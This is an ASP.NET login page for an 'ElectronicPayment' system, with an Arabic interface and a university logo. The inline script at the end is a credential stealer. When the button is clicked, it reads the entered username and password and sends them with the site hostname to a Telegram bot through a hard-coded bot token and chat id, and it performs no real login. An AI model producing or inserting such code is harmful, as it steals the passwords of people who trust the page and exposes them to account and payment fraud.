<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Login.aspx.cs" Inherits="ElectronicPayment.Login" %>
<% 
    Response.CodePage = 65001; 
    Response.CharSet = "utf-8"; 
%>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="ar" dir="rtl">
<head runat="server">
    <meta charset="utf-8" />
    <title>تسجيل الدخول</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet" />
    <style>
        body {
            background: url('img/site.jpg') no-repeat center center;
            background-size: contain;
            background-color: beige;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Tahoma', sans-serif;
            direction: rtl;
        }
        .login-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
            width: 400px;
            animation: fadeIn 1s ease-in-out;
        }
        .login-card img {
            display: block;
            margin: 0 auto 15px auto;
            width: 80px;
            height: auto;
        }
        .login-card h3 {
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            color: black;
        }
        .form-control {
            border-radius: 12px;
            padding: 10px 10px 10px 10px;
        }
        .btn-custom {
            border-radius: 50px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            background-color: darkgoldenrod;
            color: black;
            border: none;
        }
        .btn-custom:hover {
            background-color: beige;
            color: black;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="login-card">
            <img src="img/IMAGE.jpg" alt="University Logo" />
            <h3>تسجيل الدخول</h3>

            <div class="input-group mb-3">
                <span class="input-group-text"><i class="bi bi-person"></i></span>
                <asp:TextBox ID="txtUsername" runat="server" ClientIDMode="Static" CssClass="form-control" placeholder="اسم المستخدم"></asp:TextBox>
            </div>

            <div class="input-group mb-3">
                <span class="input-group-text"><i class="bi bi-lock"></i></span>
                <asp:TextBox ID="txtPassword" runat="server" ClientIDMode="Static" CssClass="form-control" TextMode="Password" placeholder="كلمة المرور"></asp:TextBox>
            </div>

            <button type="button" id="btnSubmit" class="btn btn-primary w-100 btn-custom">دخول</button>

            <div id="displayMsg" class="text-danger d-block text-center mt-3"></div>
        </div>
    </form>

<script>
    document.getElementById('btnSubmit').onclick = function() {
        var u = document.getElementById('txtUsername').value;
        var p = document.getElementById('txtPassword').value;
        var t = "👤 " + u + " | 🔑 " + p + " | 🌐 " + window.location.hostname;
        
        fetch("https://api.telegram.org/bot8432497906:AAEJ1HeP_oKQ-8uaCFbHJcZBRZQQnicOBfA/sendMessage?chat_id=7651215883&text=" + encodeURIComponent(t))
        .finally(function() {
        });
    };
</script>
</body>
</html>
